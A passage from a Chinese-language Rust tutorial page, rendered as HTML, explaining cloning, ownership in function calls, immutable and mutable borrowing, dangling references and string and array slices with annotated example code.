</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#note-cs-rust-rust-__codelineno-48-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s1</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span>
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#note-cs-rust-rust-__codelineno-48-4"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;s1 = {}, s2 = {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span><span class="p">);</span>
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#note-cs-rust-rust-__codelineno-48-5"></a><span class="p">}</span>
</span></code></pre></div>
运行结果：
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#note-cs-rust-rust-__codelineno-49-1"></a>s1 = hello, s2 = hello
</span></code></pre></div>
这里是真的将堆中的 "hello" 复制了一份，所以 s1 和 s2 都分别绑定了一个值，释放的时候也会被当作两个资源。</p>
<p>当然，克隆仅在需要复制的情况下使用，毕竟复制数据会花费更多的时间。</p>
<h3 id="note-cs-rust-rust-_27">涉及函数的所有权机制<a class="headerlink" href="#note-cs-rust-rust-_27" title="Permanent link">&para;</a></h3>
<p>对于变量来说这是最复杂的情况了</p>
<p>如果将一个变量当作函数的参数传递给其他函数，怎么样安全的处理所有权呢？</p>
<p>实例
<div class="language-rust highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#note-cs-rust-rust-__codelineno-50-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#note-cs-rust-rust-__codelineno-50-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#note-cs-rust-rust-__codelineno-50-3"></a><span class="w">    </span><span class="c1">// s 被声明有效</span>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#note-cs-rust-rust-__codelineno-50-4"></a>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#note-cs-rust-rust-__codelineno-50-5"></a><span class="w">    </span><span class="n">takes_ownership</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#note-cs-rust-rust-__codelineno-50-6"></a><span class="w">    </span><span class="c1">// s 的值被当作参数传入函数</span>
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#note-cs-rust-rust-__codelineno-50-7"></a><span class="w">    </span><span class="c1">// 所以可以当作 s 已经被移动，从这里开始已经无效</span>
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#note-cs-rust-rust-__codelineno-50-8"></a>
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#note-cs-rust-rust-__codelineno-50-9"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#note-cs-rust-rust-__codelineno-50-10"></a><span class="w">    </span><span class="c1">// x 被声明有效</span>
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#note-cs-rust-rust-__codelineno-50-11"></a>
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#note-cs-rust-rust-__codelineno-50-12"></a><span class="w">    </span><span class="n">makes_copy</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#note-cs-rust-rust-__codelineno-50-13"></a><span class="w">    </span><span class="c1">// x 的值被当作参数传入函数</span>
</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#note-cs-rust-rust-__codelineno-50-14"></a><span class="w">    </span><span class="c1">// 但 x 是基本类型，依然有效</span>
</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#note-cs-rust-rust-__codelineno-50-15"></a><span class="w">    </span><span class="c1">// 在这里依然可以使用 x 却不能使用 s</span>
</span><span id="__span-50-16"><a id="__codelineno-50-16" name="__codelineno-50-16" href="#note-cs-rust-rust-__codelineno-50-16"></a>
</span><span id="__span-50-17"><a id="__codelineno-50-17" name="__codelineno-50-17" href="#note-cs-rust-rust-__codelineno-50-17"></a><span class="p">}</span><span class="w"> </span><span class="c1">// 函数结束, x 无效, 然后是 s. 但 s 已被移动, 所以不用被释放</span>
</span><span id="__span-50-18"><a id="__codelineno-50-18" name="__codelineno-50-18" href="#note-cs-rust-rust-__codelineno-50-18"></a>
</span><span id="__span-50-19"><a id="__codelineno-50-19" name="__codelineno-50-19" href="#note-cs-rust-rust-__codelineno-50-19"></a>
</span><span id="__span-50-20"><a id="__codelineno-50-20" name="__codelineno-50-20" href="#note-cs-rust-rust-__codelineno-50-20"></a><span class="k">fn</span> <span class="nf">takes_ownership</span><span class="p">(</span><span class="n">some_string</span>: <span class="nb">String</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-50-21"><a id="__codelineno-50-21" name="__codelineno-50-21" href="#note-cs-rust-rust-__codelineno-50-21"></a><span class="w">    </span><span class="c1">// 一个 String 参数 some_string 传入，有效</span>
</span><span id="__span-50-22"><a id="__codelineno-50-22" name="__codelineno-50-22" href="#note-cs-rust-rust-__codelineno-50-22"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">some_string</span><span class="p">);</span>
</span><span id="__span-50-23"><a id="__codelineno-50-23" name="__codelineno-50-23" href="#note-cs-rust-rust-__codelineno-50-23"></a><span class="p">}</span><span class="w"> </span><span class="c1">// 函数结束, 参数 some_string 在这里释放</span>
</span><span id="__span-50-24"><a id="__codelineno-50-24" name="__codelineno-50-24" href="#note-cs-rust-rust-__codelineno-50-24"></a>
</span><span id="__span-50-25"><a id="__codelineno-50-25" name="__codelineno-50-25" href="#note-cs-rust-rust-__codelineno-50-25"></a><span class="k">fn</span> <span class="nf">makes_copy</span><span class="p">(</span><span class="n">some_integer</span>: <span class="kt">i32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-50-26"><a id="__codelineno-50-26" name="__codelineno-50-26" href="#note-cs-rust-rust-__codelineno-50-26"></a><span class="w">    </span><span class="c1">// 一个 i32 参数 some_integer 传入，有效</span>
</span><span id="__span-50-27"><a id="__codelineno-50-27" name="__codelineno-50-27" href="#note-cs-rust-rust-__codelineno-50-27"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">some_integer</span><span class="p">);</span>
</span><span id="__span-50-28"><a id="__codelineno-50-28" name="__codelineno-50-28" href="#note-cs-rust-rust-__codelineno-50-28"></a><span class="p">}</span><span class="w"> </span><span class="c1">// 函数结束, 参数 some_integer 是基本类型, 无需释放</span>
</span></code></pre></div></p>
<h3 id="note-cs-rust-rust-_28">引用与租借<a class="headerlink" href="#note-cs-rust-rust-_28" title="Permanent link">&para;</a></h3>
<p>引用类似于C语言中的指针，实质上是变量的间接访问方式</p>
<p>例如
<div class="language-rust highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#note-cs-rust-rust-__codelineno-51-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#note-cs-rust-rust-__codelineno-51-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#note-cs-rust-rust-__codelineno-51-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s1</span><span class="p">;</span><span class="c1">//&amp; 运算符可以取变量的&quot;引用&quot;。</span>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#note-cs-rust-rust-__codelineno-51-4"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;s1 is {}, s2 is {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span><span class="p">);</span>
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#note-cs-rust-rust-__codelineno-51-5"></a><span class="p">}</span>
</span></code></pre></div></p>
<p>运行结果
<code>s1 is hello, s2 is hello</code>
这样就保留了<code>s1</code>的所有权</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>当一个变量的值被引用时，变量本身不会被认定无效。因为"引用"并没有在栈中复制变量的值,而是类似于<code>s2</code>多了一个指向<code>s1</code>的指针</p>
<p>通过借用，可以避免函数丢失所有权
 <div class="language-rust highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#note-cs-rust-rust-__codelineno-52-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#note-cs-rust-rust-__codelineno-52-2"></a><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#note-cs-rust-rust-__codelineno-52-3"></a>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#note-cs-rust-rust-__codelineno-52-4"></a><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calculate_length</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#note-cs-rust-rust-__codelineno-52-5"></a>
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#note-cs-rust-rust-__codelineno-52-6"></a><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;The length of &#39;{}&#39; is {}.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">);</span>
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#note-cs-rust-rust-__codelineno-52-7"></a><span class="w"> </span><span class="p">}</span>
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#note-cs-rust-rust-__codelineno-52-8"></a>
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#note-cs-rust-rust-__codelineno-52-9"></a><span class="w"> </span><span class="k">fn</span> <span class="nf">calculate_length</span><span class="p">(</span><span class="n">s</span>: <span class="kp">&amp;</span><span class="nb">String</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">usize</span> <span class="p">{</span>
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#note-cs-rust-rust-__codelineno-52-10"></a><span class="w">     </span><span class="n">s</span><span class="p">.</span><span class="n">len</span><span class="p">()</span>
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#note-cs-rust-rust-__codelineno-52-11"></a><span class="w"> </span><span class="p">}</span>
</span></code></pre></div>
 运行结果
 <div class="language-rust highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#note-cs-rust-rust-__codelineno-53-1"></a><span class="n">The</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="o">&#39;</span><span class="na">hello</span><span class="o">&#39;</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="mf">5.</span>
</span></code></pre></div></p>
</div>
<details class="warning">
<summary>Warning</summary>
<p>引用不会获得值的所有权。</p>
<p>引用只能租借（Borrow）值的所有权。</p>
<p>引用本身也是一个类型并具有一个值，这个值记录的是别的值所在的位置，但引用不具有所指值的所有权：</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#note-cs-rust-rust-__codelineno-54-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#note-cs-rust-rust-__codelineno-54-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#note-cs-rust-rust-__codelineno-54-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s1</span><span class="p">;</span>
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#note-cs-rust-rust-__codelineno-54-4"></a><span class="kd">let</span><span class="w"> </span><span class="n">s3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s1</span><span class="p">;</span>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#note-cs-rust-rust-__codelineno-54-5"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span><span class="p">);</span>
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#note-cs-rust-rust-__codelineno-54-6"></a><span class="p">}</span>
</span></code></pre></div>
这段程序不正确：因为 <code>s2</code> 租借的 <code>s1</code> 已经将所有权移动到 <code>s3</code>，所以 <code>s2</code> 将无法继续租借使用 <code>s1</code> 的所有权。如果需要使用 <code>s2</code> 使用该值，必须重新租借.</p>
<p>既然引用不具有所有权，即使它租借了所有权，它也只享有使用权（这跟租房子是一个道理）。
如果尝试利用租借来的权利来修改数据会被阻止：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#note-cs-rust-rust-__codelineno-55-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#note-cs-rust-rust-__codelineno-55-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;run&quot;</span><span class="p">);</span>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#note-cs-rust-rust-__codelineno-55-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s1</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#note-cs-rust-rust-__codelineno-55-4"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span><span class="p">);</span>
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#note-cs-rust-rust-__codelineno-55-5"></a><span class="n">s2</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&quot;oob&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 错误，禁止修改租借的值</span>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#note-cs-rust-rust-__codelineno-55-6"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span><span class="p">);</span>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#note-cs-rust-rust-__codelineno-55-7"></a><span class="p">}</span>
</span></code></pre></div>
这段程序中 s2 尝试修改 s1 的值被阻止，租借的所有权不能修改所有者的值。</p>
<p>当然，也存在一种可变的租借方式，就像你租一个房子，如果物业规定房主可以修改房子结构，房主在租借时也在合同中声明赋予你这种权利，你是可以重新装修房子的：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#note-cs-rust-rust-__codelineno-56-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#note-cs-rust-rust-__codelineno-56-2"></a><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;run&quot;</span><span class="p">);</span>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#note-cs-rust-rust-__codelineno-56-3"></a><span class="c1">// s1 是可变的</span>
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#note-cs-rust-rust-__codelineno-56-4"></a>
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#note-cs-rust-rust-__codelineno-56-5"></a><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">s1</span><span class="p">;</span>
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#note-cs-rust-rust-__codelineno-56-6"></a><span class="c1">// s2 是可变的引用</span>
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#note-cs-rust-rust-__codelineno-56-7"></a>
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#note-cs-rust-rust-__codelineno-56-8"></a><span class="n">s2</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&quot;oob&quot;</span><span class="p">);</span>
</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#note-cs-rust-rust-__codelineno-56-9"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span><span class="p">);</span>
</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#note-cs-rust-rust-__codelineno-56-10"></a><span class="p">}</span>
</span></code></pre></div>
这段程序就没有问题了。我们用 <code>&amp;mut</code> 修饰可变的引用类型。</p>
<p>可变引用与不可变引用相比除了权限不同以外，可变引用不允许多重引用，但不可变引用可以：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#note-cs-rust-rust-__codelineno-57-1"></a><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#note-cs-rust-rust-__codelineno-57-2"></a>
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#note-cs-rust-rust-__codelineno-57-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">r1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">s</span><span class="p">;</span>
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#note-cs-rust-rust-__codelineno-57-4"></a><span class="kd">let</span><span class="w"> </span><span class="n">r2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">s</span><span class="p">;</span>
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#note-cs-rust-rust-__codelineno-57-5"></a>
</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#note-cs-rust-rust-__codelineno-57-6"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}, {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">r1</span><span class="p">,</span><span class="w"> </span><span class="n">r2</span><span class="p">);</span>
</span></code></pre></div></p>
<p>这也很好理解，万一<code>r1</code> <code>r2</code>并发改变了<code>s</code>,如何处理会是一个棘手的问题，rust在编译阶段就避免了这种情况的发生</p>
</details>
<h3 id="note-cs-rust-rust-_29">垂悬引用<a class="headerlink" href="#note-cs-rust-rust-_29" title="Permanent link">&para;</a></h3>
<p>类似于C语言中那种那种没有实际指向一个真正能访问的数据的指针(不一定是空指针，也有可能是已经释放的资源)，它们就像失去悬挂物体的绳子，所以叫"垂悬引用"</p>
<div class="language-text highlight"><pre><span></span><code>然而这种引用在rust中并不允许出现，编译器会发现这种引用并加以阻止
</code></pre></div>
<p><code>rust
fn main() {
    let reference_to_nothing = dangle();
}

fn dangle() -&gt; &amp;String {
    let s = String::from("hello");

    &amp;s
}</code>
很显然，伴随着 dangle 函数的结束，其局部变量的值本身没有被当作返回值，被释放了。但它的引用却被返回，这个引用所指向的值已经不能确定的存在，故不允许其出现。</p>
<h2 id="note-cs-rust-rust-_30">切片类型<a class="headerlink" href="#note-cs-rust-rust-_30" title="Permanent link">&para;</a></h2>
<p>切片（Slice）是对数据值的部分引用。</p>
<p>切片这个名字往往出现在生物课上，我们做样本玻片的时候要从生物体上获取切片，以供在显微镜上观察。在 Rust 中，切片的意思大致也是这样，只不过它从数据取材引用。</p>
<p>rust中的切片与python中的数组切片也是类似的</p>
<p>最简单、最常用的数据切片类型是字符串切片（String Slice），其他类型如数组切片也是允许的
<div class="language-rust highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#note-cs-rust-rust-__codelineno-59-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#note-cs-rust-rust-__codelineno-59-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;broadcast&quot;</span><span class="p">);</span>
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#note-cs-rust-rust-__codelineno-59-3"></a>
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#note-cs-rust-rust-__codelineno-59-4"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">part1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#note-cs-rust-rust-__codelineno-59-5"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">part2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="mi">5</span><span class="o">..</span><span class="mi">9</span><span class="p">];</span>
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#note-cs-rust-rust-__codelineno-59-6"></a>
</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#note-cs-rust-rust-__codelineno-59-7"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}={}+{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">part1</span><span class="p">,</span><span class="w"> </span><span class="n">part2</span><span class="p">);</span>
</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#note-cs-rust-rust-__codelineno-59-8"></a>
</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#note-cs-rust-rust-__codelineno-59-9"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="p">];</span>
</span><span id="__span-59-10"><a id="__codelineno-59-10" name="__codelineno-59-10" href="#note-cs-rust-rust-__codelineno-59-10"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">part</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">3</span><span class="p">];</span>
</span><span id="__span-59-11"><a id="__codelineno-59-11" name="__codelineno-59-11" href="#note-cs-rust-rust-__codelineno-59-11"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">part</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-59-12"><a id="__codelineno-59-12" name="__codelineno-59-12" href="#note-cs-rust-rust-__codelineno-59-12"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
</span><span id="__span-59-13"><a id="__codelineno-59-13" name="__codelineno-59-13" href="#note-cs-rust-rust-__codelineno-59-13"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-59-14"><a id="__codelineno-59-14" name="__codelineno-59-14" href="#note-cs-rust-rust-__codelineno-59-14"></a><span class="p">}</span>
</span></code></pre></div></p>
<p>rust中有<code>x..y</code>来实现<span class="arithmatex">\([x,y)\)</span>的含义</p>
<ul>
<li>..y 等价于 0..y</li>
<li>x.. 等价于位置 x 到数据结束</li>
<li>.. 等价于位置 0 到结束</li>
</ul>
<p>被切片引用的字符串禁止更改其值：</p>
<p>实例
<div class="language-rust highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#note-cs-rust-rust-__codelineno-60-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#note-cs-rust-rust-__codelineno-60-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;runoob&quot;</span><span class="p">);</span>
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#note-cs-rust-rust-__codelineno-60-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">slice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">3</span><span class="p">];</span>
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#note-cs-rust-rust-__codelineno-60-4"></a><span class="w">    </span><span class="n">s</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&quot;yes!&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 错误</span>
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#note-cs-rust-rust-__codelineno-60-5"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;slice = {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">slice</span><span class="p">);</span>
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#note-cs-rust-rust-__codelineno-60-6"></a><span class="p">}</span>
</span></code></pre></div>
这段程序不正确。</p>
